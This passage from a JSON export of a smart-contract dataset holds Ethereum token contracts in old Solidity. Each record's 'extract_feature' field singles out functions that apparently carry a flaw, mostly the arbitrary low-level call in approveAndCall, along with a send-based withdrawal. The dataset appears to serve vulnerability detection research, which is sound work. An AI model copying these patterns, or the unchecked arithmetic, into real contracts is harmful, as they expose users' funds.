  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1500000;\n totalSupply = 1500000;\n name = \"CPUTCoin\";\n decimals = 0;\n symbol = \"CPUT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1592"
  },
  "filename": "35003.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Twit is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Twit(\n ) {\n balances[msg.sender] = 800000000000000;\n totalSupply = 800000000000000;\n name = \"Twit\";\n decimals = 8;\n symbol = \"TWIT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1593"
  },
  "filename": "35004.sol",
  "content": "pragma solidity ^ 0.4 .9;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns(uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Premine is StandardToken {\n using SafeMath\n for uint256;\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Premine(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Premine\";\n decimals = 18;\n symbol = \"PRE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1594"
  },
  "filename": "35005.sol",
  "content": "pragma solidity ^ 0.4 .9;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns(uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns(uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MonkeyMan is StandardToken {\n using SafeMath\n for uint256;\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MonkeyMan(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"ManMonkey\";\n decimals = 10;\n symbol = \"MANM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1595"
  },
  "filename": "35009.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BVBToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BVBToken(\n ) {\n balances[msg.sender] = 1909;\n totalSupply = 1909;\n name = \"BVB Token\";\n decimals = 0;\n symbol = \"BVB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1596"
  },
  "filename": "35016.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DarthJahusToken is StandardToken {\n function () {\n revert();\n }\n uint256 _initialAmount = 1000000;\n string _tokenName = \"Darth Jahus Token\";\n uint8 _decimalUnits = 0;\n string _tokenSymbol = \"DJX\";\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function DarthJahusToken() {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1597"
  },
  "filename": "35023.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 150000000;\n totalSupply = 150000000;\n name = \"accommodation\";\n decimals = 0;\n symbol = \"acco\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1598"
  },
  "filename": "35024.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n address sender = msg.sender;\n require(balances[sender] >= _value);\n balances[sender] -= _value;\n balances[_to] += _value;\n Transfer(sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract GigaGivingToken is StandardToken {\n using SafeMath for uint256;\n uint256 private fundingGoal;\n uint256 private amountRaised;\n uint256 private constant PHASE_1_PRICE = 1600000000000000;\n uint256 private constant PHASE_2_PRICE = 2000000000000000;\n uint256 private constant PHASE_3_PRICE = 2500000000000000;\n uint256 private constant PHASE_4_PRICE = 4000000000000000;\n uint256 private constant PHASE_5_PRICE = 5000000000000000;\n uint256 private constant DURATION = 5 weeks;\n uint256 public constant TOTAL_TOKENS = 15000000;\n uint256 public constant CROWDSALE_TOKENS = 12000000;\n string public constant VERSION = \"GC.5\";\n uint256 public startTime;\n uint256 public tokenSupply;\n address public beneficiary;\n string public name = \"Giga Coin\";\n string public symbol = \"GC\";\n uint256 public decimals = 0;\n mapping(address => uint256) public ethBalanceOf;\n bool public fundingGoalReached = false;\n bool public crowdsaleClosed = false;\n event GoalReached(address goalBeneficiary, uint256 totalAmountRaised);\n event FundTransfer(address backer, uint256 amount, bool isContribution);\n function GigaGivingToken (address icoBeneficiary) public {\n beneficiary = icoBeneficiary;\n balances[beneficiary] = TOTAL_TOKENS.sub(CROWDSALE_TOKENS);\n balances[this] = CROWDSALE_TOKENS;\n totalSupply = TOTAL_TOKENS;\n fundingGoal = 1000 ether;\n startTime = 1510765200;\n tokenSupply = 12000000;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function () public payable {\n require(now >= startTime);\n require(now <= startTime + DURATION);\n require(!crowdsaleClosed);\n require(msg.value > 0);\n uint256 amount = msg.value;\n uint256 coinTotal = 0;\n if (now > startTime + 4 weeks) {\n coinTotal = amount.div(PHASE_5_PRICE);\n } else if (now > startTime + 3 weeks) {\n coinTotal = amount.div(PHASE_4_PRICE);\n } else if (now > startTime + 2 weeks) {\n coinTotal = amount.div(PHASE_3_PRICE);\n } else if (now > startTime + 1 weeks) {\n coinTotal = amount.div(PHASE_2_PRICE);\n } else {\n coinTotal = amount.div(PHASE_1_PRICE);\n }\n ethBalanceOf[msg.sender] = ethBalanceOf[msg.sender].add(amount);\n amountRaised = amountRaised.add(amount);\n tokenSupply = tokenSupply.sub(coinTotal);\n this.transfer(msg.sender, coinTotal);\n FundTransfer(msg.sender, amount, true);\n }\n modifier afterDeadline() {\n if (now >= (startTime + DURATION)) {\n _;\n }\n }\n function checkGoalReached() public afterDeadline {\n if (amountRaised >= fundingGoal) {\n fundingGoalReached = true;\n GoalReached(beneficiary, amountRaised);\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() public afterDeadline {\n if (!fundingGoalReached) {\n uint amount = ethBalanceOf[msg.sender];\n ethBalanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (msg.sender.send(amount)) {\n FundTransfer(msg.sender, amount, false);\n } else {\n ethBalanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n this.transfer(msg.sender, tokenSupply);\n FundTransfer(beneficiary, amountRaised, false);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function safeWithdrawal() public afterDeadline {\nif (!fundingGoalReached) {\nuint amount = ethBalanceOf[msg.sender];\nethBalanceOf[msg.sender] = 0;\nif (amount > 0) {\nif (msg.sender.send(amount)) {\nFundTransfer(msg.sender, amount, false);\n} else {\nethBalanceOf[msg.sender] = amount;\n}\n}\n}\nif (fundingGoalReached && beneficiary == msg.sender) {\nif (beneficiary.send(amountRaised)) {\nthis.transfer(msg.sender, tokenSupply);\nFundTransfer(beneficiary, amountRaised, false);\n} else {\nfundingGoalReached = false;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1599"
  },
  "filename": "35080.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"EtherLite\";\n decimals = 8;\n symbol = \"ETL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159a"
  },
  "filename": "35114.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = 